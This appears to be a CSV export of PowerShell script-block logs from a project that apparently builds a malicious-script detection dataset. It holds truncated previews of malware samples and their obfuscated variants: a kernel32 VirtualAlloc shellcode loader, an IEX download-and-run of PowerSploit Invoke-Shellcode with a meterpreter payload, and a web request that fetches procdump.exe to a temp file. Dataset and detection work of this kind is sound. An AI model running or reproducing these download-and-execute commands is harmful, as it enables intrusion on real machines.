"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/6/2026 10:03:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 10:03:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1395.ps1","2238","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:03:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:12 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:03:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1395.ps1","2803"," & ( $pShOmE[4]+$pshomE[34]+'x')(((""{27}{6}{36}{43}{40}{2}{7}{13}{9}{31}{22}{17}{20}{28}{42}{34}{45}{14}{5}{8}{0}{21}{1}{39}{46}{26}{24}{41}{19}{37}{4}{35}{29}{32}{25}{44}{33}{3}{38}{23}{10}{15}{18}{3"
"8/6/2026 10:03:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:03:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:03:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:03:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:03:04 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:03:04 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1395.ps1","2666"," . ( $ShElliD[1]+$sHelLid[13]+'X') ( ('HLEc = 1P9[DllImport(SlNke'+'rnel32.dllSlN)]public s'+'tatic extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAll'+'ocationType, uint flProtect);"
"8/6/2026 10:02:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:56 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1395.ps1","18","{([CHAr][INt]$_) }"
"8/6/2026 10:02:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1395.ps1","7570"," -JOIn ( '36Y99!32Q61>32k39<91!68Y108-108,73k109-112>111,114k116Y40-34U107s101>114s110k101,108,51s50Q46<100Q108,108Y34U41Y93>112!117s98>108!105Q99Q32-115U116Q97>116s105Q99Y32<101Y120s116k101Y114-110U3"
"8/6/2026 10:02:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1395.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1391.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:32 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1391.ps1","2952"," ((""{19}{62}{60}{14}{24}{34}{58}{55}{7}{30}{26}{11}{29}{1}{56}{42}{18}{65}{32}{33}{9}{13}{4}{28}{3}{64}{48}{39}{52}{6}{51}{69}{68}{10}{53}{59}{57}{44}{41}{8}{36}{23}{38}{27}{50}{43}{20}{54}{2}{5}{45}{"
"8/6/2026 10:02:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:24 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1391.ps1","2620"," ('r'+'Lec = 4H9[DllImport(fukkern'+'el32.dllfuk)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ui'+'nt dwSize, uin'+'t flAllocationType, uint flProtect);[DllImport(fukkerne'+'l32.dllfuk)"
"8/6/2026 10:02:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:16 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1391.ps1","19","{([ChAR][inT] $_) }"
"8/6/2026 10:02:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1391.ps1","9804"," &( $SHELlid[1]+$sHElLId[13]+'X')(-Join ((36, 99,32, 61,32,39 , 91 ,68 , 108, 108,73 ,109 ,112, 111,114 , 116 , 40,34 ,107,101 , 114, 110 ,101,108 ,51, 50 ,46 , 100,108, 108 ,34,41 ,93 ,112, 117 , 98 "
"8/6/2026 10:02:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1391.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1376.ps1","264","I`eX (nEw`-ObJ`ecT Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); i`Nv`OKE-SHeLlCOde  Payload windows/meterp"
"8/6/2026 10:01:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:52 AM","","257","IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter"
"8/6/2026 10:01:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1376.ps1","677","((""{16}{6}{49}{43}{3}{30}{20}{14}{9}{36}{29}{4}{25}{0}{35}{10}{1}{22}{33}{48}{44}{42}{18}{37}{27}{17}{26}{46}{31}{8}{38}{32}{12}{7}{5}{21}{41}{13}{2}{45}{19}{39}{11}{40}{28}{15}{23}{24}{34}{47}"" -f'/'"
"8/6/2026 10:01:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:44 AM","","257","IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter"
"8/6/2026 10:01:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1376.ps1","520","IeX (('IEX (New-'+'Object Ne'+'t.We'+'bCl'+'ien'+'t'+')'+'.D'+'ownload'+'S'+'tring('+'TZ'+'t'+'h'+'ttps://r'+'a'+'w.g'+'i'+'t'+'hu'+'bus'+'er'+'con'+'tent.'+'c'+'om/'+'mattifestation/PowerSpl'+'oit/ma"
"8/6/2026 10:01:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:36 AM","","260"," IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterprete"
"8/6/2026 10:01:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1376.ps1","23","{( [iNt] $_ -AS[chaR])}"
"8/6/2026 10:01:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1376.ps1","1306",""" $( SeT-VarIABle 'oFS'  '' )"" + [stRiNg]((73,69, 88, 32 , 40,78 , 101 ,119, 45, 79 , 98, 106 ,101 ,99 , 116,32 , 78, 101, 116,46 ,87 , 101, 98 , 67, 108,105 ,101 ,110,116 ,41 , 46, 68 ,111 ,119 ,110 "
"8/6/2026 10:01:28 AM","","9","$global:?"
"8/6/2026 10:01:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:27 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1376.ps1","257","IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter"
"8/6/2026 10:01:20 AM","","9","$global:?"
"8/6/2026 10:01:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1362.ps1","86","INVo`Ke-`w`eBRe`QUeST -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe
"
"8/6/2026 10:01:12 AM","","9","$global:?"
"8/6/2026 10:01:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:12 AM","","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:01:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1362.ps1","316","&( $PSHome[21]+$PshoMe[30]+'x') ( ((""{17}{8}{0}{7}{18}{6}{15}{11}{10}{14}{5}{19}{16}{3}{1}{2}{4}{9}{12}{13}"" -f'e','3','gtemp',':m','m3gsen','mp','tt','st ','-WebRequ','dm','procd','tderr.pl/','e.','e"
"8/6/2026 10:01:05 AM","","9","$global:?"
"8/6/2026 10:01:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:05 AM","","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:01:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1362.ps1","237","(('Invoke-'+'We'+'b'+'Req'+'uest -Uri http:/'+'/stder'+'r.pl/'+'p'+'rocdump.exe -Out'+'File'+' c'+':PLV'+'t'+'em'+'pP'+'LVs'+'endme.exe')-CrEpLace([CHaR]80+[CHaR]76+[CHaR]86),[CHaR]92)|. ( $veRbOSEpre"
"8/6/2026 10:00:57 AM","","9","$global:?"
"8/6/2026 10:00:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:57 AM","","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:00:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1362.ps1","23","{ ([INT] $_-aS[chAr]) }"
"8/6/2026 10:00:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1362.ps1","419"," [STrIng]::JOin( '' , ( '73h110k118{111i107i101i45{87@101k98_82_101h113b117b101@115_116h32_45k85_114h105@32r104b116;116b112h58@47g47b115h116@100_101h114{114;46b112k108k47g112r114b111g99@100i117i109h11"
"8/6/2026 10:00:50 AM","","9","$global:?"
"8/6/2026 10:00:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1362.ps1","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:00:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\136.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:33 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\136.ps1","2940","(((""{2}{1}{33}{11}{53}{5}{62}{56}{16}{57}{0}{46}{25}{35}{61}{21}{27}{39}{54}{65}{38}{8}{58}{20}{68}{64}{51}{41}{28}{26}{6}{45}{55}{66}{24}{10}{48}{7}{37}{4}{34}{67}{44}{18}{43}{40}{29}{69}{32}{36}{59}"
"8/6/2026 10:00:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:25 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\136.ps1","2608","& ( $SHeLlID[1]+$shELliD[13]+'X') ( ('zHsc = yad[DllImport(eZikernel32.dlleZi)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, u'+'int flAllocat'+'ionType,'+' uint flProt'+'ect"
"8/6/2026 10:00:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:17 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\136.ps1","21","{([int]$_-as[ChaR]) }"
"8/6/2026 10:00:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\136.ps1","7695","& ( ([sTriNG]$VerBOsePreFERENCe)[1,3]+'X'-joiN'')( ( '36K99M32F61S32F39M91K68~108&108&73>109G112~111j114&116F40S34~107&101>114S110>101>108K51~50K46G100S108G108j34G41M93M112&117G98K108>105M99G32S115M11"
"8/6/2026 10:00:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\136.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1354.ps1","2248","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:53 AM","","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1354.ps1","2781","((""{10}{40}{23}{39}{2}{28}{21}{35}{25}{3}{46}{19}{43}{24}{44}{15}{38}{13}{45}{26}{0}{36}{37}{34}{8}{22}{12}{30}{33}{42}{7}{18}{17}{14}{9}{41}{31}{16}{5}{4}{20}{29}{1}{32}{6}{27}{11}""-f '8b,0x58,0x20,0"
"8/6/2026 9:59:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:45 AM","","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1354.ps1","2647"," (('Q9747m '+'= isp[DllImport(2etkernel32.dll2et)]publ'+'ic static extern IntPtr VirtualAlloc(IntPtr lpAddr'+'es'+'s, ui'+'nt'+' dwSize, uint flAllocationType, uint flProtect);[DllI'+'mpo'+'rt(2etkern"
"8/6/2026 9:59:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
